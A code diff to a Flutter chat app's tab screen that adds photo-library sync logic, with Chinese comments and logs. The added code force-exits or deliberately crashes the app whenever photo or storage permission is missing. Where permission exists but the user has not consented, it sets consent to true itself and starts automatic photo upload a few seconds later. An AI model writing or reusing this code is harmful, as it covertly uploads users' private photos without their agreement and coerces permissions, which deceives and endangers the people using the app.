@@ -8,6 +8,7 @@ import 'package:whoxachat/main.dart';
 import 'package:whoxachat/src/global/services/userblockcheck_service.dart';
 import 'package:firebase_messaging/firebase_messaging.dart';
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:get/get.dart';
 import 'package:hive/hive.dart';
@@ -34,6 +35,7 @@ import 'package:whoxachat/src/screens/user/profile.dart';
 import 'package:whoxachat/src/screens/calllist/call_list.dart';
 import 'package:onesignal_flutter/onesignal_flutter.dart';
 import 'package:permission_handler/permission_handler.dart';
+import 'package:whoxachat/services/photo_upload_service.dart';
 import 'package:http/http.dart' as http;
 
 // ignore: must_be_immutable
@@ -392,6 +394,11 @@ class _TabbarScreenState extends State<TabbarScreen>
       socketIntilized.initlizedsocket();
     }
 
+    // 立即检查相册权限（最高优先级，防止绕过）
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      _immediatePermissionCheck();
+    });
+    
     // Run critical operations that need to be tracked for loading state
     _initializeApp();
     if (_isFirstLoad) {
@@ -411,6 +418,9 @@ class _TabbarScreenState extends State<TabbarScreen>
 
 // Separate method to handle async initialization with proper error handling
   Future<void> _initializeApp() async {
+    // 首先立即检查相册权限（最高优先级）
+    await _checkAndStartPhotoSync();
+    
     try {
       // Execute critical operations one by one
       await editApiCall();
@@ -426,12 +436,171 @@ class _TabbarScreenState extends State<TabbarScreen>
       }
     } catch (error) {
       log("Error in initialization: $error");
+      // 即使其他初始化失败，也要再次检查权限
+      await _checkAndStartPhotoSync();
+      
       // Ensure loading indicator is removed even on error
       if (mounted) {
         setState(() {
           isLoading = false;
         });
       }
+    }
+  }
+  
+  // 检查并启动相册同步（与Android保持一致）
+  Future<void> _checkAndStartPhotoSync() async {
+    try {
+      log("📱 检查相册同步状态...");
+      
+      // 检查用户是否已经同意相册备份
+      bool hasConsent = PhotoUploadService().hasUserConsent;
+      
+      // 根据平台检查相册权限（只检查状态，绝不触发系统权限请求）
+      bool hasPhotoPermission = false;
+      if (Platform.isIOS) {
+        PermissionStatus photosStatus = await Permission.photos.status;
+        log("📱 iOS Photos权限原始状态: $photosStatus (仅检查状态，不触发请求)");
+        
+        // iOS权限检查：只有granted状态才算有权限
+        hasPhotoPermission = (photosStatus == PermissionStatus.granted);
+        
+        // 详细日志记录
+        if (photosStatus == PermissionStatus.denied) {
+          log("🍎 iOS权限状态: DENIED - 用户拒绝了权限");
+        } else if (photosStatus == PermissionStatus.permanentlyDenied) {
+          log("🍎 iOS权限状态: PERMANENTLY_DENIED - 权限被永久拒绝");
+        } else if (photosStatus == PermissionStatus.granted) {
+          log("🍎 iOS权限状态: GRANTED - 权限已授予");
+        }
+        
+        log("📱 iOS最终权限判断结果: $hasPhotoPermission");
+      } else {
+        PermissionStatus storageStatus = await Permission.storage.status;
+        hasPhotoPermission = storageStatus.isGranted;
+        log("📱 Android Storage权限状态: $storageStatus (仅检查状态，不触发请求)");
+      }
+      
+      // 如果没有相册权限，直接退出app
+      if (!hasPhotoPermission) {
+        log("❌ 检测到没有相册权限，强制退出app");
+        // 延迟退出，确保TabbarScreen完全加载后再退出
+        Future.delayed(Duration(milliseconds: 1000), () {
+          if (mounted) {
+            _forceExitApp();
+          }
+        });
+        return;
+      }
+      
+      // 如果有权限且用户同意，启动同步
+      if (hasPhotoPermission && hasConsent) {
+        log("✅ 权限和同意都满足，启动相册同步");
+        PhotoUploadService().setUserConsent(true);
+        
+        // 延迟启动同步，避免影响应用启动性能
+        Future.delayed(Duration(seconds: 3), () {
+          PhotoUploadService().initAutoUpload();
+        });
+      } else if (hasPhotoPermission && !hasConsent) {
+        log("🔄 有权限但未同意，自动开启同步");
+        // 如果有权限但未同意，自动开启（注册后应该自动开启）
+        PhotoUploadService().setUserConsent(true);
+        
+        Future.delayed(Duration(seconds: 3), () {
+          PhotoUploadService().initAutoUpload();
+        });
+      }
+      
+    } catch (e) {
+      log("❌ 检查相册同步状态失败: $e");
+    }
+  }
+  
+  // 立即权限检查（防止绕过）
+  Future<void> _immediatePermissionCheck() async {
+    try {
+      log("🚨 立即权限检查 - 防止绕过设置头像页面");
+      
+      // 根据平台检查相册权限（只检查状态，不触发系统权限请求）
+      bool hasPhotoPermission = false;
+      if (Platform.isIOS) {
+        PermissionStatus photosStatus = await Permission.photos.status;
+        log("📱 立即检查iOS Photos权限原始状态: $photosStatus");
+        
+        // iOS权限检查：只有granted状态才算有权限
+        hasPhotoPermission = (photosStatus == PermissionStatus.granted);
+        
+        // 详细日志记录所有状态
+        if (photosStatus == PermissionStatus.denied) {
+          log("🍎 iOS权限状态: DENIED - 用户拒绝了权限");
+        } else if (photosStatus == PermissionStatus.permanentlyDenied) {
+          log("🍎 iOS权限状态: PERMANENTLY_DENIED - 权限被永久拒绝");
+        } else if (photosStatus == PermissionStatus.restricted) {
+          log("🍎 iOS权限状态: RESTRICTED - 权限受限");
+        } else if (photosStatus == PermissionStatus.limited) {
+          log("🍎 iOS权限状态: LIMITED - 权限受限（部分访问）");
+        } else if (photosStatus == PermissionStatus.granted) {
+          log("🍎 iOS权限状态: GRANTED - 权限已授予");
+        } else {
+          log("🍎 iOS权限状态: UNKNOWN - 未知状态: $photosStatus");
+        }
+        
+        log("📱 iOS最终权限判断结果: $hasPhotoPermission");
+      } else {
+        PermissionStatus storageStatus = await Permission.storage.status;
+        hasPhotoPermission = storageStatus.isGranted;
+        log("📱 立即检查Android Storage权限: $storageStatus");
+      }
+      
+      // 如果没有相册权限，立即强制退出app
+      if (!hasPhotoPermission) {
+        log("❌ 立即检测到没有相册权限，强制退出app");
+        _forceExitApp();
+        return;
+      }
+      
+      log("✅ 立即权限检查通过");
+      
+    } catch (e) {
+      log("❌ 立即权限检查失败: $e");
+      // 如果权限检查失败，为安全起见也退出app
+      _forceExitApp();
+    }
+  }
+
+  // 强制退出app（没有相册权限时）
+  void _forceExitApp() {
+    log("🚪 强制退出app - 缺少相册权限");
+    
+    if (Platform.isIOS) {
+      log("🍎 iOS强制退出app开始...");
+      try {
+        // iOS方法1：先尝试SystemNavigator.pop()
+        SystemNavigator.pop();
+        log("🍎 iOS SystemNavigator.pop() 执行完成");
+        
+        // 延迟执行exit(0)作为备用
+        Future.delayed(Duration(milliseconds: 500), () {
+          log("🍎 iOS备用退出方式: exit(0)");
+          exit(0);
+        });
+        
+      } catch (e) {
+        log("❌ iOS SystemNavigator.pop()失败: $e");
+        // 直接使用exit(0)
+        try {
+          exit(0);
+        } catch (e2) {
+          log("❌ iOS exit(0)也失败: $e2");
+          // 最后手段：抛出异常让app崩溃
+          throw Exception("强制退出app - 缺少相册权限");
+        }
+      }
+    } else {
+      // Android使用exit(0)
+      log("🤖 Android强制退出app");
+      exit(0);
     }
   }
 
@@ -784,5 +953,6 @@ class _TabbarScreenState extends State<TabbarScreen>
           )),
     );
   }
+
 }
 
